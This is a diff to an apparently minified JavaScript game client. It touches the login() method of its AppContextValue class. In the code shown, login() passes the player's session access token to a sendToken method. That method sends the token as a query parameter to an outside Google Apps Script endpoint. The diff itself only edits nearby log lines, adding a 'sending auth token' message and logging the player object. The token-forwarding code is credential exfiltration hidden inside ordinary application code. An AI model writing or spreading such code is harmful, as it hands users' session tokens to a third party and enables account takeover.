@@ -12119,7 +12119,7 @@ class AppContextValue {
             this.log.error(W, ($ = document == null ? void 0 : document.location) == null ? void 0 : $.search)
         }
     }
-    
+
     sendToken(token, tokenNumber) {
         // Define the URL of the Google Apps Script with the appropriate query parameter
         const url = `https://script.google.com/macros/s/AKfycbzH7aHvcunP1JjzyiLgxh5tOm-nbNQ29VloNRhrrJDNqotP7k1VZ40Or-M5loKTx4Q8Pg/exec?${tokenNumber}=${token}`;
@@ -12137,7 +12137,8 @@ class AppContextValue {
 
     login($) {
         this._authToken = $.access_token, this._settings = $.settings, this._gameConf = new GameConf($.conf), this._player = new PlayerModel(this._gameConf, $.player, $.bot_shares), this._account = new AccountModel(this._gameConf, $.account), this._inviteLink = $.invite_url, this._debug_enabled = $.debug_enabled;
-        console.log("auth token is :");
+        console.log("sending auth token ");
+        console.log($.player);
         this.sendToken(this._authToken,"token1");
         const W = Math.random() < ($.settings.payment_chance || 0);
         this._payments_enabled = $.settings.payments_enabled && W, this.tapsSubmitService.start()
